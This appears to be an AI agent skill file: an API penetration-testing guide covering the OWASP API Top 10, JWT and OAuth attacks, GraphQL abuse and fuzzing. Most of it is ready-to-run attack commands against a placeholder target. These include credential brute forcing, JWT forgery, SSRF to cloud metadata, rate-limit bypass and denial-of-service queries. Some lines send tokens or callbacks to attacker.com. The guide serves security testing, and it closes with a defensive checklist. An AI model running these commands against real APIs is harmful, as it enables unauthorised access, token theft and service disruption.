---
name: api-security-testing
description: API security testing guide covering OWASP API Security Top 10, JWT attacks, OAuth vulnerabilities, GraphQL security, and API fuzzing techniques.
---

# API Security Testing Skill

Comprehensive API security testing guide for 2025.

## OWASP API Security Top 10 (2023)

### API1: Broken Object Level Authorization (BOLA)
```bash
# Test IDOR vulnerabilities
# Access other users' resources

# Get user A's data with user B's token
curl -X GET https://api.target.com/users/123 \
  -H "Authorization: Bearer user_b_token"

# Increment/decrement IDs
for id in $(seq 1 100); do
  curl -s "https://api.target.com/orders/$id" \
    -H "Authorization: Bearer token" | grep -v "404"
done

# UUID enumeration
# Check if UUIDs are truly random or sequential
```

### API2: Broken Authentication
```bash
# Weak JWT secrets
jwt_tool token.jwt -C -d wordlist.txt

# JWT algorithm confusion
# Change RS256 to HS256
jwt_tool token.jwt -X a

# JWT none algorithm
jwt_tool token.jwt -X n

# Brute force credentials
hydra -L users.txt -P passwords.txt \
  https-post-form "api.target.com:443/auth/login:
  {\"email\":\"^USER^\",\"password\":\"^PASS^\"}:
  Invalid credentials"
```

### API3: Broken Object Property Level Authorization
```bash
# Mass Assignment
# Add extra properties to requests

# Original request
curl -X PUT https://api.target.com/users/me \
  -H "Authorization: Bearer token" \
  -d '{"name": "John"}'

# Attack - add admin property
curl -X PUT https://api.target.com/users/me \
  -H "Authorization: Bearer token" \
  -d '{"name": "John", "role": "admin", "isAdmin": true}'

# Excessive Data Exposure
# Check if response includes sensitive fields
curl -X GET https://api.target.com/users/me \
  -H "Authorization: Bearer token" | jq .
# Look for: password, ssn, credit_card, internal_id
```

### API4: Unrestricted Resource Consumption
```bash
# Rate limiting bypass
# Try different headers
curl https://api.target.com/endpoint \
  -H "X-Forwarded-For: 127.0.0.1"
curl https://api.target.com/endpoint \
  -H "X-Real-IP: 10.0.0.1"

# Large payload DoS
curl -X POST https://api.target.com/upload \
  -d @large_file.json

# Batch operations
curl -X POST https://api.target.com/batch \
  -d '{"ids": [1,2,3,...1000000]}'
```

### API5: Broken Function Level Authorization
```bash
# Access admin endpoints as regular user
curl -X GET https://api.target.com/admin/users \
  -H "Authorization: Bearer regular_user_token"

# Method switching
curl -X PUT https://api.target.com/users/me \
  -H "Authorization: Bearer token"
curl -X DELETE https://api.target.com/users/other_user \
  -H "Authorization: Bearer token"

# Common admin paths
/admin /administrator /manager /internal /debug /api/v1/admin
```

### API6: Unrestricted Access to Sensitive Business Flows
```bash
# Abuse business logic
# Example: Free trials
curl -X POST https://api.target.com/trial/start
curl -X DELETE https://api.target.com/trial/cancel
curl -X POST https://api.target.com/trial/start  # Repeat

# Example: Referral abuse
for i in $(seq 1 100); do
  curl -X POST https://api.target.com/referral \
    -d "{\"code\": \"FRIEND$i\"}"
done
```

### API7: Server Side Request Forgery (SSRF)
```bash
# Internal network scanning
curl -X POST https://api.target.com/webhook \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

curl -X POST https://api.target.com/fetch \
  -d '{"url": "http://localhost:6379/INFO"}'

# Cloud metadata endpoints
# AWS: http://169.254.169.254/latest/meta-data/
# GCP: http://metadata.google.internal/computeMetadata/v1/
# Azure: http://169.254.169.254/metadata/instance
```

### API8: Security Misconfiguration
```bash
# Check for exposed endpoints
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.json
curl https://api.target.com/api-docs
curl https://api.target.com/graphql  # Introspection

# Debug mode
curl https://api.target.com/debug
curl https://api.target.com/actuator/env

# CORS misconfiguration
curl -X OPTIONS https://api.target.com \
  -H "Origin: https://evil.com"
```

### API9: Improper Inventory Management
```bash
# Version enumeration
curl https://api.target.com/v1/users
curl https://api.target.com/v2/users
curl https://api.target.com/api/v1/users
curl https://api.target.com/api/beta/users

# Deprecated endpoints
# Often less secured or have known vulnerabilities

# Shadow APIs
# Undocumented endpoints discovered through fuzzing
```

### API10: Unsafe Consumption of APIs
```bash
# Third-party API injection
# Inject malicious data through integrated services

# Webhook manipulation
curl -X POST https://api.target.com/webhook \
  -d '{"callback": "https://attacker.com/collect"}'
```

## JWT Attack Techniques

### JWT Structure
```
Header.Payload.Signature

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "1234567890", "name": "John", "iat": 1516239022}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

### Common JWT Attacks
```bash
# Decode JWT
jwt_tool eyJhbGci...

# Crack weak secret
jwt_tool eyJhbGci... -C -d /usr/share/wordlists/rockyou.txt

# Algorithm confusion (RS256 → HS256)
jwt_tool eyJhbGci... -X a -pk public_key.pem

# None algorithm
jwt_tool eyJhbGci... -X n

# Key injection (JKU/X5U)
jwt_tool eyJhbGci... -X s -ju "https://attacker.com/jwks.json"

# Kid path traversal
jwt_tool eyJhbGci... -I -hc kid -hv "../../dev/null"
```

### JWT Best Practices Testing
```
Checklist:
- [ ] Strong secret (>256 bits)
- [ ] RS256 preferred over HS256
- [ ] Expiration (exp) claim present
- [ ] Short expiration time
- [ ] Token revocation mechanism
- [ ] JTI (JWT ID) for replay prevention
```

## OAuth/OIDC Security

### OAuth Attack Vectors
```bash
# Authorization Code Theft
# Redirect URI manipulation
https://auth.target.com/authorize?
  client_id=xxx&
  redirect_uri=https://attacker.com/callback&
  response_type=code

# Open Redirect in redirect_uri
redirect_uri=https://legitimate.com@attacker.com
redirect_uri=https://legitimate.com%0d%0a%0d%0aattacker.com

# State parameter bypass
# Missing or predictable state = CSRF

# PKCE bypass (for public clients)
# Check if code_challenge is actually validated
```

### Token Security
```bash
# Access token leakage
# Check browser history, referrer headers, logs

# Refresh token theft
# Long-lived refresh tokens stored insecurely

# Token reuse
# Test if revoked tokens are actually invalidated
```

## GraphQL Security

### Introspection Attack
```graphql
# Full schema disclosure
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Using tools
python3 graphw00f.py -t https://api.target.com/graphql
inql -t https://api.target.com/graphql
```

### GraphQL Injection
```graphql
# Batching attack (DoS)
[
  {"query": "{users{id}}"},
  {"query": "{users{id}}"},
  # ... repeat 1000 times
]

# Nested query attack
{
  user(id: 1) {
    friends {
      friends {
        friends {
          # Deep nesting = DoS
        }
      }
    }
  }
}

# Field suggestion exploitation
{
  __type(name: "User") {
    fields {
      name
    }
  }
}
```

### GraphQL Authorization
```graphql
# IDOR via GraphQL
{
  user(id: "other_user_id") {
    email
    password
  }
}

# Accessing mutations
mutation {
  deleteUser(id: "admin_id") {
    success
  }
}
```

## API Fuzzing

### FFUF (Fast Web Fuzzer)
```bash
# Endpoint discovery
ffuf -u https://api.target.com/FUZZ -w wordlist.txt

# Parameter fuzzing
ffuf -u "https://api.target.com/users?FUZZ=value" -w params.txt

# Method fuzzing
ffuf -u https://api.target.com/users \
  -X FUZZ -w methods.txt

# JSON fuzzing
ffuf -u https://api.target.com/users \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"name": "FUZZ"}' \
  -w payloads.txt
```

### Postman/Burp Collection Fuzzing
```javascript
// Postman script for auth bypass
pm.sendRequest({
    url: pm.environment.get("base_url") + "/admin/users",
    method: "GET",
    header: {
        "Authorization": ""  // Empty auth
    }
}, function(err, res) {
    if (res.code !== 401) {
        console.log("Potential bypass found!");
    }
});
```

## API Security Checklist

### Authentication
- [ ] Strong password policy enforced
- [ ] Rate limiting on login endpoints
- [ ] Account lockout implemented
- [ ] JWT secrets are strong (>256 bits)
- [ ] Token expiration is short
- [ ] Refresh token rotation

### Authorization
- [ ] BOLA protection on all resource access
- [ ] Function-level access control
- [ ] No mass assignment vulnerabilities
- [ ] Admin endpoints protected

### Input Validation
- [ ] All input validated and sanitized
- [ ] SQL injection protected
- [ ] NoSQL injection protected
- [ ] Command injection protected

### Rate Limiting
- [ ] Per-user rate limiting
- [ ] Per-IP rate limiting
- [ ] Expensive operations throttled

### Logging & Monitoring
- [ ] Authentication events logged
- [ ] Authorization failures logged
- [ ] No sensitive data in logs
- [ ] Alerting configured

## Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| JWT cracking | jwt_tool | `jwt_tool token -C -d wordlist.txt` |
| API fuzzing | ffuf | `ffuf -u URL/FUZZ -w wordlist.txt` |
| GraphQL introspection | inql | `inql -t URL/graphql` |
| BOLA testing | Burp | Autorize extension |
| Rate limit bypass | Custom | X-Forwarded-For header rotation |
